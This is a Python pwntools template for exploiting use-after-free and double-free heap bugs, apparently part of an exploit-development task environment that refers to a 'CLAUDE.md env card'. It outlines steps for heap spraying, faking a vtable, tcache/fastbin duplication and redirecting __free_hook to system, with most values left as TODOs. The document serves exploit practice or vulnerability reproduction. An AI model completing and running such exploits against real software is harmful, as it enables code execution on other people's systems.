#!/usr/bin/env python3
"""UAF / double-free skeleton.

Reclaim the freed object with attacker data, then either fake an object
(vtable/function pointer) or turn the dangling pointer into tcache/fastbin
dup. Constants from CLAUDE.md env card.
"""
from pwn import ELF, context, process

context.log_level = "info"
BINARY = "/out/<binary>"     # TODO
elf = ELF(BINARY, checksec=False)

# 1. From the fix diff: WHICH object is freed and WHAT follows (field layout)?
#    Write the struct here:
OBJ_SIZE = 0                 # TODO
FIELDS = {
    # "vtable_ptr": (0, 8),   # offset, size — target if C++ object
    # "len": (8, 8),
}

# 2. Which input structure allocates same-size chunks with content you control?
def spray_data(fake_obj: bytes) -> bytes:
    """Encode one spray element into the input format (repeat N times)."""
    # TODO
    return b""

# 3. The reclaim sequence (from poc + fix diff): trigger free -> spray ->
#    the dangling pointer now reads your bytes.
def build_input(fake_obj: bytes) -> bytes:
    return b"<trigger-free>" + spray_data(fake_obj) * 32 + b"<use-after-free>"

# 4. Fire: fake vtable points at a buffer you control (ASLR off -> stable
#    heap address; find it once by crashing with a marker and reading the
#    faulting address), or system via __free_hook if you get a UAF-write.
VTABLE_FAKE = 0              # TODO stable address of your controlled buffer
SYSTEM = 0                   # TODO absolute from env card

if __name__ == "__main__":
    io = process(["bash", "/workspace/run.sh"], cwd="/workspace")
    io.send(build_input(b"A" * OBJ_SIZE))
    io.recvall(timeout=10)   # marker crash => read address, then craft fake obj
